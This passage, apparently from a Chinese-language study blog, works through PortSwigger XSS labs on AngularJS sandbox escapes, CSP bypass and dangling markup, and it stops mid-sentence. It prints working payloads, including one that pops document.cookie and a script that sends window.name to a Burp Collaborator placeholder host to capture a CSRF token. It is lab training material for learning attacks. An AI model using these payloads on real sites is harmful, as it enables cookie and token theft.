attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span><span class="token punctuation">></span></span>    &#123;&#123;    'a'.constructor.prototype.charCodeAt=[].concat    &#125;&#125;  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p><strong>解析：</strong></p><p>这段代码是一个示例，它展示了一个潜在的安全漏洞。它利用了 AngularJS中的一个问题来演示如何覆盖 <code>charCodeAt</code>函数以实现代码注入。</p><p>在这个示例中，使用了 AngularJS 1.4.6 版本，并在 <code>ng-app</code>的作用域内使用了双花括号 <code>&#123;&#123;&#125;&#125;</code>进行表达式求值。在这里，通过修改<code>'a'.constructor.prototype.charCodeAt</code> 的值为<code>[].concat</code>，覆盖了原生的 <code>charCodeAt</code> 函数。</p><p>当页面加载完成后，会调用 <code>onload</code> 函数，其中使用<code>alert</code> 显示了 <code>'abc'.charCodeAt(0)</code>的结果。正常情况下，该结果应为 <code>'97'</code>，即字母 a 的 ASCII值。但由于我们在前面的代码中修改了 <code>charCodeAt</code>函数，它现在返回的是基础字符串 <code>'abc'</code> 和参数 <code>0</code>连接在一起的结果。</p></li><li><p>Code</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>validAttrs<span class="token punctuation">[</span>lkey<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token boolean">true</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>uriAttrs<span class="token punctuation">[</span>lkey<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token boolean">true</span> <span class="token operator">||</span> <span class="token function">uriValidator</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> isImage<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">out</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">out</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">out</span><span class="token punctuation">(</span><span class="token string">'="'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">out</span><span class="token punctuation">(</span><span class="token function">encodeEntities</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">out</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>解析</strong>:</p><p>这段代码是一个条件语句，用于处理属性值的安全过滤和输出:</p><ol type="1"><li><p><code>validAttrs[lkey] === true</code>:这个条件检查属性是否是一个有效的属性。如果属性是有效的，继续进行后续处理。</p></li><li><p><code>(uriAttrs[lkey] !== true || uriValidator(value, isImage))</code>:这个条件检查属性是否是一个 URI 属性，并且通过了 URI验证。<code>uriAttrs</code> 是一个包含 URI 属性的列表，如果属性不是 URI属性，或者属性的值通过了 URI 验证器 <code>uriValidator</code>的验证，继续进行后续处理。</p></li><li><p><code>out(' ');</code>: 这行代码将一个空格字符输出。</p></li><li><p><code>out(key);</code>: 这行代码将属性名输出。</p></li><li><p><code>out('="');</code>:这行代码将等号和双引号输出，用于开始属性值的引用。</p></li><li><p><code>out(encodeEntities(value));</code>: 这行代码调用<code>encodeEntities</code>函数对属性值进行编码，确保输出的属性值是安全的。</p></li><li><p><code>out('"');</code>: 这行代码输出属性值结束的双引号。</p></li></ol><p>综合起来，这段代码的作用是对属性值进行安全过滤，并将过滤后的属性名和属性值输出。如果属性是有效的且通过了URI 验证（或不是 URI属性），则会将属性名和编码后的属性值输出，确保输出的字符串是安全的。</p></li><li><p>Code</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">encodeEntities</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> value<span class="token punctuation">.</span>    <span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>    <span class="token function">replace</span><span class="token punctuation">(</span><span class="token constant">SURROGATE_PAIR_REGEXP</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> hi <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> low <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token string">'&amp;#'</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>hi <span class="token operator">-</span> <span class="token number">0xD800</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x400</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>low <span class="token operator">-</span> <span class="token number">0xDC00</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x10000</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>    <span class="token function">replace</span><span class="token punctuation">(</span><span class="token constant">NON_ALPHANUMERIC_REGEXP</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token string">'&amp;#'</span> <span class="token operator">+</span> value<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>    <span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;lt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>    <span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;gt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p><strong>解析：</strong></p><p>在给定的代码中，<code>encodeEntities</code> 函数用于对字符串值进行HTML 实体编码，以确保在输出到 HTML文档中时，特殊字符被正确地表示而不会被误解释。</p><p>函数中的步骤如下：</p><ol type="1"><li>使用正则表达式 <code>/&amp;/g</code> 替换字符串中的<code>&amp;</code> 符号为 <code>&amp;amp;</code>，以避免其被解释为 HTML实体的起始标记。</li><li>使用 <code>SURROGATE_PAIR_REGEXP</code>正则表达式进行匹配和替换，该正则表达式用于处理 Unicode代理对字符。它将两个代理对字符转换为对应的 Unicode实体编码，以确保它们被正确地表示。</li><li>使用 <code>NON_ALPHANUMERIC_REGEXP</code>正则表达式进行匹配和替换，该正则表达式用于处理非字母数字字符。它将非字母数字字符转换为对应的Unicode 实体编码，以确保它们被正确地表示。</li><li>使用 <code>/&amp;lt;/g</code> 正则表达式替换字符串中的<code>&lt;</code> 符号为<code>&amp;lt;</code>，以确保其被正确地表示而不会被解释为 HTML标签的起始符号。</li><li>使用 <code>/&amp;gt;/g</code> 正则表达式替换字符串中的<code>&gt;</code> 符号为<code>&amp;gt;</code>，以确保其被正确地表示而不会被解释为 HTML标签的结束符号。</li></ol><p>在给定的代码中，<code>replace(SURROGATE_PAIR_REGEXP, ...)</code>表示使用正则表达式 <code>SURROGATE_PAIR_REGEXP</code>进行匹配和替换操作。该正则表达式用于处理 Unicode 代理对字符。</p><p>Unicode 代理对字符是一种特殊的字符表示形式，由两个 Unicode代理对组成。在 JavaScript中，一个代理对字符被编码为两个字符的序列，称为高位（highsurrogate）和低位（lowsurrogate）。为了正确地表示这些字符，需要将它们转换为对应的 Unicode实体编码。</p><p>在 <code>replace(SURROGATE_PAIR_REGEXP, ...)</code>的回调函数中，它获取匹配到的代理对字符，并将其转换为相应的 Unicode实体编码。具体的步骤如下：</p><ol type="1"><li><code>value.charCodeAt(0)</code> 获取代理对字符的高位字符的 Unicode编码。</li><li><code>value.charCodeAt(1)</code> 获取代理对字符的低位字符的 Unicode编码。</li><li><code>hi - 0xD800</code> 计算高位字符编码与高位字符的起始编码<code>0xD800</code> 的差值。</li><li><code>low - 0xDC00</code> 计算低位字符编码与低位字符的起始编码<code>0xDC00</code> 的差值。</li><li><code>((hi - 0xD800) * 0x400) + (low - 0xDC00) + 0x10000</code>将差值乘以 <code>0x400</code> 并加上<code>0x10000</code>，得到代理对字符的 Unicode 码点。</li><li><code>'&amp;#' + (((hi - 0xD800) * 0x400) + (low - 0xDC00) + 0x10000) + ';'</code>将 Unicode 码点转换为形如 <code>&amp;#&lt;code&gt;;'</code>的实体编码形式。</li></ol><p>通过这个过程，Unicode 代理对字符会被正确地转换为对应的 Unicode实体编码，以确保在输出到 HTML 中时能够正确地表示这些特殊字符。</p></li><li><p>Code</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span><span class="token punctuation">></span></span>    &#123;&#123;    'a'.constructor.fromCharCode=[].join;    'a'.constructor[0]='",alert(1),"';    $eval('"\\u0061"')+''    &#125;&#125;  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p><strong>解析</strong>：</p><p>这段代码使用了 Angular 框架，并利用了<code>String.fromCharCode</code>的一个特性来注入恶意代码。让我逐步解释一下代码的原理：</p><ol type="1"><li><p><code>'a'.constructor.fromCharCode=[].join;</code> 这行代码将<code>fromCharCode</code> 函数重写为数组的 <code>join</code>函数，这样当 <code>fromCharCode</code> 被调用时，它实际上执行的是数组的<code>join</code> 函数而不是原始的字符串转码函数。</p></li><li><p><code>'a'.constructor[0]='",alert(1),"';</code>这行代码将字符串构造函数的索引 0 处的值修改为<code>",alert(1),"</code>，这样在使用字符串构造函数创建字符串时，它的首字母将被替换为恶意代码。</p></li><li><p><code>$eval('"\\u0061"')+''</code> 这行代码使用 Angular 的<code>$eval</code> 函数执行字符串表达式 <code>"\\u0061"</code>，它表示Unicode 编码为 <code>\u0061</code> 的字符<code>'a'</code>。由于之前修改了字符串构造函数，此处的 <code>'a'</code>实际上是带有恶意代码的字符串。然后通过字符串连接操作<code>+''</code>，将其转换为字符串并输出。</p></li></ol><p>综合上述步骤，通过篡改 <code>fromCharCode</code>函数和字符串构造函数，恶意代码 <code>",alert(1),"</code>被注入并成功执行。在这个特定的例子中，<code>alert(1)</code>将显示一个警示框，内容为数字 1。</p></li><li><p>客户端模板注入漏洞是指在使用客户端模板框架的应用程序中，动态地将用户输入嵌入到网页中所导致的漏洞。在渲染页面时，框架会扫描页面中的模板表达式，并执行遇到的每个表达式。攻击者可以利用这一点，提供恶意的模板表达式来发起跨站脚本（XSS）攻击。</p><p><strong>具体原理</strong>如下：</p><ol type="1"><li>应用程序使用客户端模板框架（例如AngularJS、React等）来构建动态网页。</li><li>在构建网页时，应用程序将用户输入作为数据传递给模板引擎。</li><li>模板引擎会扫描页面中的模板表达式，并将其替换为对应的数据。</li><li>如果用户输入的数据未经充分的验证或过滤，并且直接嵌入到模板表达式中，就可能导致模板注入漏洞。</li><li>攻击者可以利用模板注入漏洞构造恶意的模板表达式，其中包含可以执行恶意代码的跨站脚本。</li><li>当网页被渲染时，模板引擎会执行恶意的模板表达式，导致恶意代码在用户浏览器中执行，从而实现攻击者的恶意目的，如窃取用户信息、篡改页面内容等。</li></ol><h6id="lab-reflected-xss-with-angularjs-sandbox-escape-without-strings-1">Lab:Reflected XSS with AngularJS sandbox escape without strings</h6><ol type="1"><li><p>Payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">search<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>charAt<span class="token operator">%</span>3d<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">|</span>orderBy<span class="token operator">:</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span></code></pre><p><strong>解析：</strong></p><ol type="1"><li><p><code>search=1</code>：将 URL 参数 <code>search</code> 的值设置为<code>1</code>。这可能是一个标志，用于指示服务器在处理请求时执行特定的操作。</p></li><li><p><code>toString().constructor.prototype.charAt%3d[].join</code>：这部分payload 是一个连续的表达式，主要用于重写 AngularJS 沙箱中的<code>charAt</code> 函数，使其成为 <code>join</code>函数。具体解释如下：</p><ul><li><code>toString()</code>：将当前对象转换为字符串。</li><li><code>constructor</code>：获取对象的构造函数。</li><li><code>prototype</code>：获取构造函数的原型对象。</li><li><code>charAt</code>：原型对象的一个函数，用于返回指定索引位置的字符。</li><li><code>%3d</code>：URL 编码中的等号 (<code>=</code>)。</li><li><code>[].join</code>：将一个空数组转换为字符串，并使用空字符串连接数组中的元素。这里相当于将<code>charAt</code> 函数重写为 <code>join</code> 函数。</li></ul><p>通过将 <code>charAt</code> 函数重写为 <code>join</code> 函数，绕过了AngularJS 沙箱的限制，从而允许执行更多操作。</p></li><li><p><code>[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1</code>：这部分payload 是一个过滤器操作，用于执行恶意代码。具体解释如下：</p><ul><li><code>[1]</code>：创建一个数组，这里只包含一个元素<code>1</code>。</li><li><code>orderBy</code>：AngularJS的过滤器操作符，用于对数组进行排序。在这里使用它来执行恶意代码。</li><li><code>toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)</code>：通过调用<code>toString()</code>方法获取当前对象的字符串表示，然后获取其构造函数，并使用构造函数的<code>fromCharCode</code>方法将一系列字符编码转换为字符串。这里的字符编码是<code>(120,61,97,108,101,114,116,40,49,41)</code>，对应的是 ASCII码中的字符 <code>'x=alert(1)'</code>。</li><li><code>=1</code>：将刚刚生成的字符串作为参数传递给<code>orderBy</code> 过滤器，并与 <code>1</code>进行比较。由于比较操作符 <code>=</code>的优先级较低，所以先执行了前面的恶意代码。</li></ul><p>这样，恶意代码 <code>'x=alert(1)'</code> 就会被执行。由于之前重写了<code>charAt</code> 函数，AngularJS不会对恶意代码进行沙箱限制，从而允许执行任意操作，例如弹出一个警示框。这可能导致跨站脚本攻击(XSS) 或其他安全问题。</p></li></ol></li></ol></li><li><p>How does an AngularJS CSP bypass work?</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>input autofocus ng<span class="token operator">-</span>focus<span class="token operator">=</span><span class="token string">"$event.path|orderBy:'[].constructor.from([1],alert)'"</span><span class="token operator">></span></code></pre><p><strong>解析：</strong></p><ul><li><p><code>&lt;input&gt;</code>：HTML输入元素，表示文本输入框。</p></li><li><p><code>autofocus</code>：HTML属性，指定元素在页面加载时自动获得焦点。</p></li><li><p><code>ng-focus</code>：AngularJS指令，用于在元素获得焦点时触发相应的事件处理函数。</p></li><li><p><code>$event</code>：AngularJS内置变量，表示当前事件对象。</p></li><li><p><code>.path</code>：表示事件对象的属性</p><p>该属性包含一个对象数组，这些对象会导致事件被执行。数组的最后一个属性始终是<code>window</code>对象，我们可以利用它来进行<code>沙箱逃逸</code>。通过将这个数组传递给orderBy 过滤器，我们可以枚举数组并使用最后一个元素（即 window对象）来执行<code>全局函数</code>，比如 alert()</p></li><li><p><code>|orderBy</code>：AngularJS过滤器，用于对数组进行排序。</p></li><li><p><code>: '[].constructor.from([1],alert)'</code>：orderBy过滤器的参数，指定排序规则。在这里，使用字符串表示排序规则。</p></li><li><p><code>'[].constructor.from([1],alert)'</code>：字符串表示的排序规则，涉及AngularJS 的特殊语法。</p></li><li><p><code>[]</code>：表示一个空数组。</p></li><li><p><code>.constructor</code>：表示 JavaScript中对象的构造函数属性。</p></li><li><p><code>.from([1],alert)</code>：利用 constructor 的 from()函数，将 <code>[1]</code> 转换为数组，并在数组的每个元素上调用 alert()函数。</p></li></ul><p>综合起来，该 Payload 在 <code>&lt;input&gt;</code> 元素上绑定了<code>ng-focus</code> 事件，当元素获得焦点时，会执行<code>$event.path|orderBy:'[].constructor.from([1],alert)'</code> 这段AngularJS 表达式。该表达式的作用是通过 orderBy 过滤器对<code>$event.path</code> 数组进行排序，排序规则使用了 AngularJS的特殊语法，其中通过构造函数的 from() 函数将 <code>[1]</code>转换为数组，并在数组的每个元素上调用 alert()函数。因此，当元素获得焦点时，将执行 alert()函数，显示一个弹窗。通过利用 AngularJS 的特殊语法和内置变量，实现了 CSP绕过和执行恶意代码的目的。</p></li><li><p><strong>长度限制</strong>的payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>alert<span class="token punctuation">)</span></code></pre></li></ul><h5 id="lab-reflected-xss-with-angularjs-sandbox-escape-and-csp-1">Lab:Reflected XSS with AngularJS sandbox escape and CSP</h5><ul><li><p>Payload</p><pre class="language-Js" data-language="Js"><code class="language-Js">&lt;script&gt;location&#x3D;&#39;https:&#x2F;&#x2F;YOUR-LAB-ID.web-security-academy.net&#x2F;?search&#x3D;%3Cinput%20id&#x3D;x%20ng-focus&#x3D;$event.composedPath()|orderBy:%27(z&#x3D;alert)(document.cookie)%27%3E#x&#39;;&lt;&#x2F;script&gt;</code></pre><p><strong>解析：</strong></p><p><code>&lt;script&gt;</code>：这是HTML中用于嵌入JavaScript代码的标签。</p><p><code>location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';</code>：这是JavaScript代码段，用于重定向当前页面的浏览器位置（URL）。在这里，我们将浏览器的位置设置为一个URL，该URL是我们要利用的实验室的URL，并包含了一个搜索参数。</p><p><code>https://YOUR-LAB-ID.web-security-academy.net/?search=</code>：这是实验室的URL，其中<code>YOUR-LAB-ID</code>应该被替换为你的实验室ID。</p><p><code>%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x</code>：这是一个经过URL编码的字符串，作为搜索参数传递给实验室的URL。它包含了一个HTML输入元素和AngularJS事件处理器。</p><ul><li><code>%3C</code>：URL编码表示字符"&lt;"。</li><li><code>input%20id=x</code>：定义了一个输入元素，其中<code>id</code>属性设置为"x"。</li><li><code>%20</code>：URL编码表示空格。</li><li><code>ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27</code>：这是ng-focus事件处理器的定义，它会在输入元素获得焦点时触发。在这里，我们使用了<code>$event.composedPath()</code>来获取事件对象的路径，并通过管道符号（|）将其传递给orderBy过滤器。</li><li><code>:</code>：表示过滤器的参数分隔符。</li><li><code>%27</code>：URL编码表示单引号（'）。</li><li><code>(z=alert)(document.cookie)</code>：这是一个JavaScript表达式，我们将alert函数赋值给了变量z，并调用document.cookie来获取当前页面的Cookie值。</li><li><code>%27</code>：URL编码表示单引号（'）。</li><li><code>%3E</code>：URL编码表示字符"&gt;"。</li><li><code>#x</code>：URL片段标识符，表示锚点为"x"。</li></ul><p><code>&lt;/script&gt;</code>：这是HTML中用于结束JavaScript代码段的标签。</p><p>总而言之，这段payload的作用是在实验室的URL中发起一个搜索请求，搜索参数中包含了一个特殊的输入元素和AngularJS事件处理器。该处理器通过管道符号将事件路径传递给orderBy过滤器，并在路径中达到window对象时执行一个JavaScript表达式，以弹出当前页面的Cookie值。</p></li></ul><h5 id="summary">Summary</h5><ul><li><p>反射型XSS（<code>Reflected XSS</code>）和存储型XSS（<code>Stored XSS</code>）之间的区别在于数据的处理方式和嵌入点的时机。</p><p>反射型XSS发生在应用程序从HTTP请求中获取某些输入，并以不安全的方式将该输入嵌入到<strong>即时响应</strong>中。这种类型的攻击通常是通过构造恶意的URL或表单提交来实现的。当用户点击恶意链接或提交恶意表单时，应用程序会在响应中反射显示恶意代码，从而导致攻击成功。</p><p>而存储型XSS则是应用程序将输入数据存储在服务器端，并在后续的响应中以不安全的方式将其嵌入。这种类型的攻击通常发生在用户输入的内容被存储在<strong>数据库或文件</strong>中，并在其他用户访问相关页面时被提取和展示。攻击者可以在输入中注入恶意代码，当其他用户浏览受影响的页面时，恶意代码会被执行，从而实现攻击。</p><p>总结而言，反射型XSS在即时响应中嵌入恶意代码，而存储型XSS将输入数据存储起来，并在后续的响应中嵌入恶意代码。<strong>存储型XSS</strong>的攻击影响范围更广，因为恶意代码可以被多个用户访问到。</p></li><li><p>以下是各种类型的XSS攻击的<strong>举例</strong>说明：</p><ol type="1"><li>反射型XSS（Reflected XSS）：<ul><li>攻击者构造一个恶意的URL，其中包含注入恶意脚本的参数。当用户点击该URL时，服务器将恶意脚本反射到响应中，并在用户的浏览器中执行。例如：<code>http://example.com/search?query=&lt;script&gt;alert('Reflected XSS')&lt;/script&gt;</code></li></ul></li><li>存储型XSS（Stored XSS）：<ul><li>攻击者在一个公共留言板中提交一个包含恶意脚本的留言。当其他用户查看该留言时，服务器从数据库中检索并返回该留言的内容，并在其他用户的浏览器中执行恶意脚本。例如：在留言板中提交内容为<code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code>的留言。</li></ul></li><li>DOM型XSS（DOM-based XSS）：<ul><li>攻击者构造一个特定的URL，当用户点击该URL时，浏览器会执行JavaScript代码，该代码修改页面的DOM结构，导致恶意脚本的执行。例如：<code>http://example.com/#&lt;script&gt;document.getElementById('myElement').innerHTML='DOM-based XSS'&lt;/script&gt;</code></li></ul></li><li>自我XSS（Self-XSS）：<ul><li>攻击者通过社交工程手段欺骗用户自行执行恶意代码。例如，攻击者在社交媒体上发布一条消息，声称这是一个有趣的JavaScript代码片段，诱使用户将该代码片段复制粘贴到自己的浏览器控制台中执行。一旦用户执行了这段代码，就可能触发自我XSS攻击，执行恶意操作，例如窃取用户的登录凭证。</li></ul></li></ol></li></ul><h4 id="content-security-policy-1">Content security policy</h4><h5id="lab-reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack-2">Lab:Reflected XSS protected by very strict CSP, with dangling markupattack</h5><ol type="1"><li><p>发现xss漏洞<imgsrc="https://s2.loli.net/2023/05/28/3Jhro5Z16wRsDXN.png"alt="image-20230528170902507" /></p></li><li><p>绕过<code>CSP</code>获取CSRF</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'//BURP-COLLABORATOR-SUBDOMAIN?'</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>location <span class="token operator">=</span> <span class="token string">'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%/web-security/cross-site-scripting/content-security-policy/22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token comment">// 上述中的“/web-security/cross-site-scripting/content-security-policy/”得去掉</span>否则burp collaborator无响应<span class="token comment">// 其中的三个替换字段需注意</span></code></pre></li><li><p>burp collaborator<imgsrc="https://s2.loli.net/2023/05/28/QBKNe7ws3OWljEC.png"alt="image-20230528171604698" /></p></li><li><p>burp proxy抓包网站的email update报文<imgsrc="https://s2.loli.net/2023/05/28/XBarp17snGdxvJq.png"alt="image-20230528171933498" /></p></li><li><p>csrf poc 生成<imgsrc="https://s2.loli.net/2023/05/28/ynqIeFZ3NgCtwrB.png"alt="image-20230528172059242" /></p></li><li><p>将html 粘贴到server中</p></li><li><p>两次使用的payload 原理难以理解</p></li></ol><h5 id="lab-reflected-xss-protected-by-csp-with-csp-bypass-1">Lab:Reflected XSS protected by CSP, with CSP bypass</h5><ol type="1"><li><p>试探搜索框<imgsrc="https://s2.loli.net/2023/06/07/5zNe9kqRmKfbiGB.png"alt="image-20230607174819339" /></p><p>检查响应和CSP设置：通过BurpProxy观察到服务器返回的响应中包含了Content-Security-Policy头，其中的<strong>report-uri</strong>指令包含了一个名为token的参数。这个参数可以被恶意用户控制，并可以用于注入<strong>自定义的CSP指令</strong>。</p></li><li><p>利用CSP指令注入：恶意用户访问一个特定的URL，该URL中包含了之前搜索框中注入的恶意脚本作为搜索内容，并且通过token参数注入了CSP指令<code>;script-src-elem 